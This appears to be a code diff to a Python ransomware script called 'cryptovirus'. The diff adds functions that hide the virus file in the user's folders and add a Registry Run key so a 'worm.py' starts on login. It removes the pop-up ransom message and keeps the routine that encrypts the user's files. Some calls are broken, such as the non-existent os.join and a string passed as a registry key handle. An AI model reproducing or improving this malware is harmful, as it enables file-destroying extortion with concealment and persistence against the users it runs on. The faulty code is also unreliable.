@@ -1,11 +1,10 @@
 #!/usr/bin/python3.8
-import win32con
+import win32con, winreg, win32api
+import os
 import win32gui
 from cryptography.fernet import Fernet
 import getpass
 import glob
-import tkinter
-from tkinter import messagebox
 
 
 def hide_console():
@@ -13,6 +12,25 @@ def hide_console():
     # in background
     hide = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
+
+def incognito():
+    # Hides the virus file in the system
+    usr = getpass.getuser()
+    path = 'C:/Users/' + usr
+    for virus in glob.glob(path + '/**/cryptovirus.py', recursive=True):
+        win32api.SetFileAttributes(virus, win32con.FILE_ATTRIBUTE_HIDDEN)
+
+
+def add_registry():
+    path = os.path.dirname(os.path.realpath(__file__))
+    worm_name = "worm.py"
+    address = os.join(path, worm_name)
+    key = "HKEY_CURRENT_USER"
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
+    winreg.SetValueEx(open, "any_name", 0, winreg.REG_SZ, address)
+    winreg.CloseKey(open)
 
 
 def encrypt_files():
@@ -74,16 +92,11 @@ def encrypt_files():
             with open(f_name, "wb") as file:
                 file.write(encrypted_data)
 
-                # this function prompts a window containing the ransom message
-                window = tkinter.Tk()
-                window.wm_withdraw()
-                header = "HELLO... YOUR FILES HAVE BEEN ENCRYPTED"
-                body = "PAY UP"
-                messagebox.showinfo(title=header, message=body)
-
 
 def main():
     hide_console()
+    incognito()
+    add_registry()
     encrypt_files()
 
 
